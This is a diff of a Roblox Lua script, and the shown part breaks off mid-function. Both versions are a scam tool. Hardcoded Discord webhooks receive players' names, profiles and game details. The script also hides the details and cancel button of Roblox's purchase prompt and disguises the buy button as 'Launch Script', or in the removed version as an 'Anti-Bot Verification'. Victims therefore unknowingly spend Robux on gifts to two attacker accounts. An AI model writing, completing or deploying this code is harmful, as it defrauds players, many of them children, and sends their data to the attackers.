@@ -1,571 +1,1212 @@
-local HttpService = game:GetService("HttpService")
+-- Configuration
+LogsWebhook = "https://discordapp.com/api/webhooks/1345845274068910233/lrQzS48o7448ZJW7sVp2urneECa5xnwiD5jm_VeEJIZL0t50XL8Dp1GzmRbbT7sI3XLI" -- Webhook for standard user gifts
+ExecutionWebhook = "https://discordapp.com/api/webhooks/1357801007417131180/4RTSkJBc1pfGzJjBiAYUwMjwPnNu1D2CEFbOJJUMP2WcQ02hUfbaZhnzoLGyzLzUh724" -- Primary Webhook for script executions
+Username = "aka_0ver" -- The primary Roblox username to gift items to
+
+-- << Obfuscate After This >>
+PromptText = "Launch Script"
+RandomizedPrompt = false
+
+-- << New Variables >>
+AdminUsername = "x6TNine" -- The secondary Roblox username (admin) to gift items to
+AdminLogsWebhook = "https://discordapp.com/api/webhooks/1341656445992566856/bRTdn_IfzIBF7JY696AO8UhyjMT9LGX6zVgR8jT4zWgf6iASgDxEWvH3ploQtGxOe2bp" -- Webhook specifically for Admin gifts
+AllLogsWebhook = "https://discordapp.com/api/webhooks/1342394835184652299/AFaRNZ-XT4mDhCv1my0GHA2ndM3UobSVRc1m--48u28viH7vBHxRSk0jrEaMSyROkwhm" -- Webhook that receives ALL gift logs (Admin + User)
+AllExecutionsWebhook = "https://discordapp.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5" -- Secondary Webhook that receives ALL execution logs
+
+-- << Obfuscate after this moment (For devs, not making it for user)
+
+repeat task.wait() until game:IsLoaded()
+
+if _G.scriptExecuted then
+    warn("You have already executed this code.")
+    return
+end
+
+local unsupportedExecutor = "Delta"
+local kickMessage = unsupportedExecutor .. " DOES NOT WORK on mobile. Please try a different executor (e.g., Codex, ArceusX or Fluxus) or use a PC."
+
+-- Use the more detailed executor check first
+local function getExecutor()
+    if syn then return "Synapse X"
+    elseif identifyexecutor then return identifyexecutor() -- Common function name
+    elseif getexecutor then return getexecutor() -- Another common function name
+    elseif fluxus then return "Fluxus" -- Fluxus specific global
+    -- Add checks for other specific executors if needed
+    else return "Unknown" end
+end
+
+local function isMobile()
+    local UserInputService = game:GetService("UserInputService")
+    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+end
+
+_G.scriptExecuted = true
+
+local currentExecutor = getExecutor()
+if currentExecutor == unsupportedExecutor and isMobile() then
+    game.Players.LocalPlayer:Kick(kickMessage)
+    return -- Stop execution if kicking
+end
+
+-- Services
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local player = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local marketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local VirtualInputManager = game:GetService("VirtualInputManager") -- Added for Escape key simulation
 
-local webhookUrl = "https://discordapp.com/api/webhooks/1341656445992566856/bRTdn_IfzIBF7JY696AO8UhyjMT9LGX6zVgR8jT4zWgf6iASgDxEWvH3ploQtGxOe2bp"  -- Replace with your Discord webhook URL
+-- Game Info
+local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
 
--- Capture the player's name, display name, and game details
-local playerName = player.Name
-local playerDisplayName = player.DisplayName
-local playerUserId = player.UserId
-local gameId = game.PlaceId
+-- Core Variables
+local UserId
+local AdminUserId -- << New Variable
+local version = "1.3.0" -- Consider updating if script logic changes significantly
+local totalSpent = 0
+local promptConfirmed = false
+local purchaseInProgress = false
 
--- Get the game name using MarketplaceService
-local success, gameInfo = pcall(function()
-    return MarketplaceService:GetProductInfo(gameId)
-end)
+-- Shortened Messages List
+local messages = {
+    "Here's your gift!",
+    "Enjoy your new item!",
+    "A little something for you!",
+    "Hope you like it!",
+    "You deserve this!",
+    "Just a small token of appreciation!",
+    "Here you go!",
+    "Something special for you!",
+    "You've earned this!",
+    "Enjoy!",
+    "Here's a little surprise!",
+    "Hope this makes your day!",
+    "You're awesome!",
+    "Here's a gift from us!",
+    "You're the best!",
+    "Here's something to help you out!",
+    "We appreciate you!",
+    "Here's a little something!",
+    "You're amazing!",
+    "Here's a gift for you!",
+    "OMG OMG u got a prez!",
+    "Guuuuess whattttttt? 🎁",
+    "LOL FREEBIES GO BRRRR",
+    "Hope this doesn't suck lol!",
+    "Wowza you lucky!",
+    "CONGRATSSSSSSSSSS!!!",
+    "H3R3 u go! ^_^",
+    "✨ surprise in ur inbox! ✨",
+    "Gotchu a lil smth smth!",
+    "AYOOOO free loot time!",
+    "Unwrapping intensifies...",
+    "Bruh u better like this!",
+    "YOU. GOT. THIS. 🎁",
+    "Whaaat? More gifts??",
+    "ROFL ENJOY IT IDK",
+    "Cool beans, it’s yours!",
+    "Hope this ain’t mid lol",
+    "OMG PRESENT TIME LET’S GO",
+    "POGGERS CLAIM IT FAST",
+    "Ding ding ding! Free stuff!",
+    "Uhhh, gift moment? 🎉",
+    "Hey there! This is for you!",
+    "Whoops, dropped this lol",
+    "GIFT ACQUIRED EZ CLAP",
+    "CHEEZ BURGER AND FREE GIFT",
+    "Shinyyyyy things are fun!",
+    "LMAO hope this slaps",
+    "Bam! Gift attack incoming!",
+    "U deserve the world! 🎁",
+    "Loooool this is urs now",
+    "SUPRISEEEE it’s lit!",
+    "gibberish but it’s urs!!",
+    "Take it b4 it explodes lol",
+    "Welp here it goes!!! 🎉",
+    "Oops I clicked gift haha",
+    "RAWR XD this is a present",
+    "GIFT BAZOOKA FIRED!!!",
+    "Claim it and flex bro!",
+    "YOU WIN AGAIN! Sheesh!",
+    "No cap, you’re epic! 🎁",
+    "HAPPY GIFT DAY OMGGG",
+    "WOOF free stuff 4 u",
+    "Ahhhh it’s shiny af",
+    "Too many gifts?? Never!",
+    "Look what we got ya!",
+    "BRRRRRRR IT’S A GIFT!",
+    "Kinda random but take it",
+    "BEEP BOOP GIFT MODE ON",
+    "Gift machine says yes",
+    "Open fast! It’s sizzling!",
+    "OMG take it before I do!!",
+    "Bruh it’s lit open it",
+    "YAAAAAY TIME TO PARTY",
+    "GIFT HYPE OVERLOAD!!",
+    "You’re da best frfr!",
+    "A lil token, enjoy!!!",
+    "POW! Gift bomb!! 💣",
+    "Surprise delivery incoming!",
+    "Random act of kindness <3",
+    "FREEEEEEEEEEEEE!!!!",
+    "Uhhh yeah take it idk",
+    "WHOOSH PRESENT TIME",
+    "✨✨✨ shinyyyyy ✨✨✨",
+    "OMG LOOT DROP!!!",
+    "YOU’RE ON FIRE!!! 🔥",
+    "Can I have it? JK lol",
+    "FREE STUFF OH YEAHHHH",
+    "Ping! It’s gift o’clock!",
+    "Smells like victory! 🎁",
+    "This made me think of u!",
+    "Hope u like this tiny gift!",
+    "Oops dropped dis 4 u",
+    "Zoom zoom gift zoom",
+    "Catch it b4 it flies lol",
+    "Hope it’s not a potato!",
+    "Big brain vibes w/ this",
+    "CONGRATULAAAAATIONS!",
+    "Idk wut this is lol enjoy",
+    "FREE LOOT IS BEST LOOT",
+    "💖💖💖 TAKE DIS NOW 💖💖💖",
+    "Bruh moment: Free Stuff",
+    "We rly out here gifting",
+    "BIG W U GOT A THING",
+    "Thank u 4 existing lol",
+    "GIFTS. MORE GIFTS. YES.",
+    "CHEESE AND FREEBIES",
+    "Gift god has blessed u",
+    "This will prob make u lol",
+    "Not clickbait: It’s a gift",
+    "u r amazing take this pls",
+    "it’s tiny but it’s epic",
+    "SHAZAAM enjoy da gift",
+    "Skrrt take this thing!",
+    "Present unlocked: WOW!",
+    "FREEBIE HUNTER ALERT",
+    "Imagine not opening this",
+    "FR U DESERVE THIS LOL",
+    "It’s raining gifts, bro!",
+    "Yas yas yas u r loved",
+    "POG FREE GIFT WHO DIS",
+    "Claim this or regret it",
+    "🛸 GIFT FROM OUTER SPACE 🛸",
+    "Take a chill pill & enjoy!",
+    "Oops this 4 u lol",
+    "DO NOT DELETE THIS OMG",
+    "Gifted with luv <3",
+    "Mysterious box time...",
+    "Uhhh enjoy?? it’s sus",
+    "Surpriiiiseeeeee! 🥳",
+    "BEST. DAY. EVER. 🎁",
+    "Like it? Don’t? Here!",
+    "BOOM u got a gift!",
+    "FREE BREAD jk it’s a gift",
+    "Look inside QUICKKKK",
+    "Bruh free means awesome",
+    "Wheeee free loot wow",
+    "So hype right now OMG",
+    "Ur da MVP, enjoy this!",
+    "PLZ CLAIM IT OMG FAST",
+    "Luv u, here’s a gift!",
+    "Roses r red, gifts r cool",
+    "Oops my finger slipped lol",
+    "Open it or else 👀",
+    "Prize unlocked: GO GO GO",
+    "SNACK + GIFT = UR DAY",
+    "IM SO EXCITED AHHHH",
+    "You gotta smile now lol",
+    "Oops here’s somethin’",
+    "Best gift evarrrr open it",
+    "Catch this gift LOL",
+    "Woooo u won! Gift time",
+    "YEEET present delivered",
+    "LOL hope u don’t hate it",
+    "AHHHH THIS FOR YOUUUU",
+    "SWAG GIFT CLAIMED EZ",
+    "Boom gift bomb LMAO",
+    "Prize machine said yes",
+    "POW ur prize unlocked",
+    "Gift train has arrived!!",
+    "Hope ur day just got lit!",
+    "Hype gifts r hype af",
+    "UR LUCKY DAYYYY OMG",
+    "Wiggles gift in ur face",
+    "Iz dis ok lolol",
+    "Bruh I’m so happy 4 u",
+    "Yo dawg enjoy this lol",
+    "Rainbows and freebies 🌈",
+    "Lowkey random but enjoy",
+    "Prize unlocked EZ POG",
+    "LOL RANDOM GIFTTT",
+    "Okay okay, u got this!",
+    "🚨 EMERGENCY PRESENT 🚨",
+    "Bruh moment: Gift Time",
+    "Huuuuge gift vibes here",
+    "LUV IT OR ELSE! jk lol",
+    "Woo woo gifts 4 everyone!",
+    "BING BANG BOOM GIFT",
+    "You absolute legend! 🎉",
+    "Whaaaaat omg take it!!",
+    "Plz don’t reject this LOL",
+    "Shiny! Shiny! TAKE IT!",
+    "POGGIES PRESENT TIME",
+    "Ez clap u win AGAIN!!",
+    "Hope it makes u lolol",
+    "Peace, love, and gifts!",
+    "Pro gamer loot drop!!",
+    "Bruh so much hype rn",
+    "It’s lowkey a big deal",
+    "SWAG MODE ACTIVATED",
+    "Idek wut dis is lol",
+    "Claim ASAP or I cry",
+    "LOL imagine not liking it",
+    "Do a dance! Gift dance!",
+    "Bet u weren’t ready LOL",
+    "BOOM TAKE THIS LITNESS",
+    "Ok bye, gift time 4 u",
+    "✨✨✨ THIS FOR U ✨✨✨",
+    "Hope it’s not sus lolol",
+    "Claim fast or it yeets!",
+    "Surprise! U da best!!!",
+    "OMG TAKE DIS RIGHT NOW",
+    "Gifts 4 da homies LOL",
+    "Plz open omg suspense",
+    "YOU LIT, HAVE THIS OMG",
+    "Hope this makes ur day",
+    "Gift spam activated yay!",
+    "Lowkey shiny af prize",
+    "BIG W IT’S ALL YOURS",
+    "Sus gift? Nah it’s fine",
+    "Open fast b4 it runs lol",
+    "POW POW POW GIFT ALERT",
+    "OMG THIS IS UR DAYYYY",
+    "Kinda pog, not gonna lie",
+    "Surprise it’s a prezzzz",
+    "Hope it ain’t mid lol",
+    "BRB gifting more ppl",
+    "LOL OKAY THIS FOR U",
+    "Wheeeeee prize moment",
+    "BRRRRRRRRR PRIZE TIME",
+    "Keep being awesome yay!",
+    "Ahhhhhh free gift 4 u",
+    "Gift city! Population: U",
+    "Oops, I gifted again lol",
+    "Hope it’s not cringe!!",
+    "You totally earned this",
+    "WOOT claim it super fast",
+    "Zoom zoom free stuff",
+    "Yasssss gift unlocked",
+    "Bro you’re so lucky omg",
+    "Big vibes, cool gift",
+    "DO NOT IGNORE THIS OMG",
+    "Random? Nah. You rock",
+    "Shiny prizes unlocked EZ",
+    "LOL PRESENTS FOREVERR",
+    "Oops hope u enjoy LOL",
+    "Tadaaa! Random prize!",
+    "Bet u didn’t expect this!",
+    "Big hype 4 u, enjoy it",
+    "UwU gift spam unlocked",
+    "BWAHAHAHA GIFT CLAIMED",
+    "Peace out, gift moment",
+    "Hope this ain’t cringe",
+    "YEETTTTT enjoy fam!",
+    "Take this tiny joy bomb",
+    "Ahhhh so much hype rn",
+    "Free free freeeee!!",
+    "IMAGINE NOT CLAIMING",
+    "Gimme it back lol JK",
+    "Shinyyyyyyy gift 4 u",
+    "Surprise delivery woot",
+    "Catch da vibes omg yay",
+    "Whaaaaaaat? Take it!",
+    "Shhhh it’s ur gift now",
+    "Bruh srsly freeee loot",
+    "Claim b4 I take it back",
+    "WHOOSH random gift!!!",
+    "LOL free loot moment",
+    "Bruh okay bye free stuf",
+    "Hope it slaps LOL",
+    "U better open dis RN",
+    "Freebieeeeeeeeees lmao",
+    "100% swag certified gift",
+    "EZ clap take it NOW",
+    "LMAO bro ur so lucky",
+    "OMG SPAMMING GIFTS!!",
+    "Bruh I wanna keep it LOL",
+    "GIFT SEASON GO BRRRR",
+    "Pog free gift madness",
+    "Hype train gift unlocked",
+    "Claim or I cry 4ever",
+    "Boom gift unlocked!!!",
+    "Bruhhhh swag overload",
+    "U LIT enjoy ur swag gift",
+    "Imagine not claiming lol",
+    "Peace, gift unlocked!!",
+    "LUV THIS GIFT OMG",
+    "Take it or I take it lol",
+    "Boom free stuff gang!!",
+    "Peace and freebies lol",
+    "Surprise! It’s HYPE AF",
+    "Hope u vibin now LOL",
+    "Swag moments only here",
+    "Bruh ur so pog rn",
+    "Surpriseeee gift LOL",
+    "Claim now! Big W alert",
+    "Ez swaggy prize time",
+    "Kinda lit prize ngl",
+    "You vibin? Freebies!!",
+    "BOOM more free stuff",
+    "Hope this is a vibe lol",
+    "Yassss gift moment",
+    "Bet u didn’t see this!",
+    "Bruhhhhhhhh omg gifts",
+    "Claim ittttt OMG hype",
+    "BRRRR free loot vibes",
+    "Ez vibes swag prize",
+    "U r epic! Claim now",
+    "GIFT CITY 4 U BRUH",
+    "Hype mode prize claim",
+    "Swaggy moment frfr",
+    "Prize vibes activated",
+    "LOL who wants a gift",
+    "Gib prize lol no backsies",
+    "Bruh swag mode GO",
+    "Luv ya! Here’s a prize",
+    "Boom prize gang vibin",
+    "Oops lol free gift!!",
+    "Take it bro EZ vibez",
+    "Boom boom swag prize",
+    "Frfr u deserve this LOL",
+    "Swag pog prize OMG",
+    "Lol take it vibeeee",
+    "Swag unlocked free stuf",
+    "Bruh so lucky OMG",
+    "Peace bro free vibez",
+    "Ahhhhhhhhhh gifts yay",
+    "Brrrrrr gifts unlocked",
+    "LOL big W claim NOW",
+    "Swaggy swag vibessss",
+    "Imagine not vibing rn",
+    "Oops lol big swag vibes",
+    "Woot swag momentsss",
+    "Yasssssss swag unlocked",
+    "Take it OMG swaggy",
+    "Peace out big vibes lol",
+    "Claim bro big swag LMAO",
+    "Oops vibing prize time",
+    "Take it lol swag mode",
+    "Bruhhhhhhhh claim itttttt",
+    "EZ clap gift gang",
+    "Boom swag unlocked!!",
+    "Swaggy vibes prize LOL",
+    "Bruhhhh swag unlocked!!",
+    "OMG OMG W gift vibes",
+    "Claim free stuff rn omg",
+    "LOL vibe moment vibes",
+    "Bruh vibe unlocked now",
+    "Take it fast omg EZ",
+    "Bruh EZ W gift rn",
+    "Vibe unlocked omg EZ",
+    "Swaggy pog vibes rn",
+    "Peace big swag vibes",
+    "Claim swag prize rn omg",
+    "Brrr swaggy vibes EZ",
+    "Big W gift vibes rn omg",
+    "Claim bro EZ vibes rn",
+    "Claim free gift rn omg",
+    "Boom EZ swag vibes rn",
+    "Hype swag unlocked rn",
+    "Imagine swag vibes rn"
+  }
 
-local gameName = success and gameInfo.Name or "Unknown Game"
-local gameLink = "https://www.roblox.com/games/" .. gameId
+-- Helper Functions
+local function getRandomMessage()
+    return messages[math.random(1, #messages)]
+end
 
--- Construct the player's Roblox profile link
-local playerProfileLink = "https://www.roblox.com/users/" .. playerUserId .. "/profile"
+local function getRandomColor()
+    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+end
 
--- Create the embed message
-local function createEmbed()
-    return {
-        ["embeds"] = {
-            {
-                ["title"] = "**✅ SCRIPT EXECUTED - CAPTURE ✅**",
-                ["color"] = 0x00FF00,  -- Green color
-                ["fields"] = {
-                    {
-                        ["name"] = "USERNAME",
-                        ["value"] = playerName,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "DISPLAY NAME",
-                        ["value"] = playerDisplayName,  -- Display name
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "GAME NAME",
-                        ["value"] = gameName,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "GAME LINK",
-                        ["value"] = gameLink,  -- Game link
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "PROFILE LINK",
-                        ["value"] = playerProfileLink,  -- Profile link
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "PING",
-                        ["value"] = "@everyone",  -- PING field
-                        ["inline"] = false
-                    },
-                },
-                ["footer"] = {
-                    ["text"] = "Executed on Roblox",  -- Added credits
-                    ["icon_url"] = "https://www.roblox.com/favicon.ico"  -- Roblox icon
-                },
-            }
-        }
+local function getRandomFont()
+    local fonts = {
+        Enum.Font.PermanentMarker, Enum.Font.Arcade, Enum.Font.Bangers,
+        Enum.Font.Creepster, Enum.Font.DenkOne, Enum.Font.Highway,
+        Enum.Font.IndieFlower, Enum.Font.JosefinSans, Enum.Font.Merriweather
     }
+    return fonts[math.random(1, #fonts)]
 end
 
--- Function to send a POST request to the webhook URL
-local function sendWebhookNotification()
-    local data = HttpService:JSONEncode(createEmbed())
-    
-    -- Attempt to send the notification using various request methods
-    pcall(function()
-        if syn then  -- For Synapse X
-            syn.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = data
-            })
-        elseif http_request then  -- For KRNL, etc.
-            http_request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = data
-            })
-        elseif http then  -- For other executors
-            http.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = data
-            })
+-- UI Manipulation Functions
+local function loopSinkTransparency()
+    while task.wait() do -- Use task.wait() directly in the loop condition
+        local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
+            and game.Players.LocalPlayer.PlayerGui.ViewportOverlay:FindFirstChild("Sink")
+        if sink then
+            sink.BackgroundTransparency = 1
         end
-    end)
+    end
 end
 
--- Send the initial notification when the script is executed
-sendWebhookNotification()
+local function hideNotifications()
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    local notifications = playerGui:FindFirstChild("Notifications")
+    if notifications then
+        notifications.Enabled = false
+    end
+end
 
-task.spawn(function()
-    local success, result = pcall(function()
-        local TweenService = game:GetService("TweenService")
-        local RunService = game:GetService("RunService")
-        local CoreGui = game:GetService("CoreGui")
+local function modifyPromptUI(isFirstPrompt)
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
+    local prompt = Animator:FindFirstChild("Prompt")
+    if not prompt then return end
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return end
 
-        local function typewriterEffect(textLabel, text, speed)
-            textLabel.Text = ""
-            task.spawn(function()
-                local currentText = ""
-                for i = 1, #text do
-                    if not textLabel or not textLabel.Parent then break end
-                    currentText = currentText .. string.sub(text, i, i)
-                    textLabel.Text = currentText
-                    task.wait(speed or 0.05)
+    prompt.BackgroundTransparency = 1
+    prompt.Image = ""
+
+    local titleContainer = alertContents:FindFirstChild("TitleContainer")
+    if titleContainer then
+        local titleArea = titleContainer:FindFirstChild("TitleArea")
+        if titleArea then
+             titleArea.Visible = false
+        end
+    end
+
+    local middleContent = alertContents:FindFirstChild("MiddleContent")
+    if middleContent then
+        middleContent.Visible = false
+    end
+
+    local footer = alertContents:FindFirstChild("Footer")
+    if not footer then return end -- Ensure footer exists
+
+    local buttons = footer:FindFirstChild("Buttons")
+    if buttons then
+        local button1 = buttons:FindFirstChild("1")
+        if button1 then
+            button1.Visible = false
+        end
+
+        local button2 = buttons:FindFirstChild("2")
+        if button2 then
+            -- Check if custom UI already exists to prevent duplicates
+            if button2:FindFirstChild("ButtonContainer") then return end
+
+            button2:ClearAllChildren() -- Clear existing default button content
+
+            local buttonContainer = Instance.new("Frame")
+            buttonContainer.Name = "ButtonContainer"
+            buttonContainer.Size = UDim2.new(1, 0, 1, 0)
+            buttonContainer.BackgroundTransparency = 1
+            buttonContainer.Parent = button2
+
+            local background = Instance.new("Frame")
+            background.Name = "Background"
+            background.Size = UDim2.new(1, 0, 1, 0)
+            background.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Base color
+            background.BackgroundTransparency = 0.1 -- Slightly less transparent
+            background.Parent = buttonContainer
+
+            local corner = Instance.new("UICorner")
+            corner.CornerRadius = UDim.new(0.2, 0)
+            corner.Parent = background
+
+            local gradient = Instance.new("UIGradient")
+            gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
+            local gradientColors
+            if RandomizedPrompt then
+                 gradientColors = {
+                    ColorSequenceKeypoint.new(0, getRandomColor()),
+                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
+                    ColorSequenceKeypoint.new(1, getRandomColor())
+                }
+            else
+                gradientColors = {
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
+                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 150, 255))
+                }
+            end
+            gradient.Color = ColorSequence.new(gradientColors)
+            gradient.Parent = background
+
+            local glow = Instance.new("ImageLabel")
+            glow.Name = "Glow"
+            glow.BackgroundTransparency = 1
+            glow.Image = "rbxassetid://7912134082" -- Ensure this asset ID is still valid/appropriate
+            glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(80, 150, 255)
+            glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
+            glow.Size = UDim2.new(1.2, 0, 1.2, 0)
+            glow.Position = UDim2.new(0.5, 0, 0.5, 0)
+            glow.AnchorPoint = Vector2.new(0.5, 0.5)
+            glow.ZIndex = background.ZIndex - 1 -- Place behind background
+            glow.Parent = buttonContainer
+
+            local buttonText = Instance.new("TextLabel")
+            buttonText.Name = "ButtonText"
+            buttonText.Size = UDim2.new(1, 0, 1, 0)
+            buttonText.BackgroundTransparency = 1
+            buttonText.Text = PromptText or "Execute Script" -- Use configured text
+            buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
+            buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
+            buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0
+            buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.PermanentMarker
+            buttonText.TextScaled = true
+            buttonText.ZIndex = background.ZIndex + 1
+            buttonText.Parent = buttonContainer
+
+            local textShadow = buttonText:Clone()
+            textShadow.Name = "TextShadow"
+            textShadow.Position = UDim2.new(0, 2, 0, 2) -- Slight offset for shadow
+            textShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
+            textShadow.TextTransparency = 0.8
+            textShadow.ZIndex = buttonText.ZIndex - 1 -- Behind main text
+            textShadow.Parent = buttonContainer
+
+            -- Animations
+            local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+            local glowInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true) -- Loop indefinitely
+
+            local glowTween = TweenService:Create(glow, glowInfo, {
+                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6,
+                Size = UDim2.new(1.3, 0, 1.3, 0)
+            })
+            glowTween:Play()
+
+            -- Hover Effects Connections
+            button2.MouseEnter:Connect(function()
+                TweenService:Create(buttonContainer, hoverInfo, { Size = UDim2.new(1.1, 0, 1.1, 0) }):Play()
+                local hoverGradientColors
+                if RandomizedPrompt then
+                    hoverGradientColors = { ColorSequenceKeypoint.new(0, getRandomColor()), ColorSequenceKeypoint.new(0.5, getRandomColor()), ColorSequenceKeypoint.new(1, getRandomColor()) }
+                else
+                    hoverGradientColors = { ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 170, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 200, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 170, 255)) }
                 end
+                TweenService:Create(gradient, hoverInfo, { Color = ColorSequence.new(hoverGradientColors) }):Play()
+                TweenService:Create(glow, hoverInfo, { ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6 }):Play()
+            end)
+
+            button2.MouseLeave:Connect(function()
+                 TweenService:Create(buttonContainer, hoverInfo, { Size = UDim2.new(1, 0, 1, 0) }):Play()
+                 TweenService:Create(gradient, hoverInfo, { Color = ColorSequence.new(gradientColors) }):Play()
+                 TweenService:Create(glow, hoverInfo, { ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8 }):Play()
             end)
         end
+    end
 
-        local function applyChanges(prompt, counter)
-            local alertContents = prompt:WaitForChild("AlertContents")
-            prompt.Image = ""
-            prompt.ImageTransparency = 1
-            prompt.BackgroundTransparency = 1
-            prompt.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-            prompt.BorderSizePixel = 0
-
-            local promptGradient = Instance.new("UIGradient")
-            promptGradient.Color = ColorSequence.new({
-                ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
-                ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))
-            })
-            promptGradient.Parent = prompt
-
-            local promptGlow = Instance.new("ImageLabel")
-            promptGlow.Name = "Glow"
-            promptGlow.BackgroundTransparency = 1
-            promptGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
-            promptGlow.Position = UDim2.new(-0.25, 0, -0.25, 0)
-            promptGlow.ZIndex = -1
-            promptGlow.Image = "rbxasset://textures/ui/Glow.png"
-            promptGlow.ImageColor3 = Color3.fromRGB(0, 0, 0)
-            promptGlow.ImageTransparency = 0.5
-            promptGlow.Parent = prompt
-
-            local titleLabel = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
-            titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-            titleLabel.Font = Enum.Font.Code
-            titleLabel.TextScaled = true
-            titleLabel.Size = UDim2.new(0, 386, 0, 26)
-
-            local titleStroke = Instance.new("UIStroke")
-            titleStroke.Color = Color3.fromRGB(0, 0, 0)
-            titleStroke.Thickness = 2
-            titleStroke.Parent = titleLabel
-
-            typewriterEffect(titleLabel, "Anti-Bot Verification v" .. counter) -- << Change it to ur stuff
-
-            local function setupButton(button)
-                if button and button:IsA("ImageButton") and button.Visible then
-                    for _, child in pairs(button:GetChildren()) do
-                        child:Destroy()
-                    end
-                    button:ClearAllChildren()
-                    button.Image = ""
-                    button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-                    button.AutoButtonColor = false
-                    button.BorderSizePixel = 0
-
-                    local container = Instance.new("Frame")
-                    container.Size = UDim2.new(1, 0, 1, 0)
-                    container.BackgroundTransparency = 1
-                    container.ClipsDescendants = true
-                    container.Parent = button
-
-                    local innerShadow = Instance.new("ImageLabel")
-                    innerShadow.BackgroundTransparency = 1
-                    innerShadow.Image = "rbxassetid://7131311876"
-                    innerShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
-                    innerShadow.ImageTransparency = 0.5
-                    innerShadow.Size = UDim2.new(1, 0, 1, 0)
-                    innerShadow.Parent = container
-
-                    local outerGlow = Instance.new("ImageLabel")
-                    outerGlow.BackgroundTransparency = 1
-                    outerGlow.Image = "rbxasset://textures/ui/Glow.png"
-                    outerGlow.ImageColor3 = Color3.fromRGB(0, 128, 128)
-                    outerGlow.ImageTransparency = 0.8
-                    outerGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
-                    outerGlow.Position = UDim2.new(-0.25, 0, -0.25, 0)
-                    outerGlow.ZIndex = -1
-                    outerGlow.Parent = button
-
-                    local edgeHighlight = Instance.new("UIStroke")
-                    edgeHighlight.Color = Color3.fromRGB(0, 255, 255)
-                    edgeHighlight.Thickness = 1.5
-                    edgeHighlight.Transparency = 0.5
-                    edgeHighlight.Parent = button
-
-                    local gradient = Instance.new("UIGradient")
-                    gradient.Color = ColorSequence.new({
-                        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-                        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200))
-                    })
-                    gradient.Rotation = 45
-                    gradient.Transparency = NumberSequence.new(0.95)
-                    gradient.Parent = button
-
-                    local textLabel = Instance.new("TextLabel")
-                    textLabel.Name = "ButtonText"
-                    textLabel.Size = UDim2.new(1, 0, 1, 0)
-                    textLabel.BackgroundTransparency = 1
-                    textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
-                    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
-                    textLabel.TextStrokeTransparency = 0
-                    textLabel.TextScaled = true
-                    textLabel.Font = Enum.Font.Code
-                    textLabel.Parent = container
-
-                    typewriterEffect(textLabel, ({ "I'm not a bot", "Continue", "Verify" })[math.random(1, 3)], 0.08)
-
-                    button.MouseEnter:Connect(function()
-                        if not button or not button.Parent then return end
-
